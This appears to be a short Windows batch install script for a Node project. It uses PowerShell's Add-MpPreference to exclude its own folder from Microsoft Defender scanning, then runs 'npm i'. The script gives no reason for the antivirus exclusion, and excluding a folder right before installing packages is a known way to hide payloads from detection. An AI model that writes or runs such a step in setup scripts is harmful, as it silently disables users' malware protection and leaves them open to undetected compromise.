@echo off
setlocal
set folder=%~dp0
powershell.exe Add-MpPreference -ExclusionPath %folder%
npm i
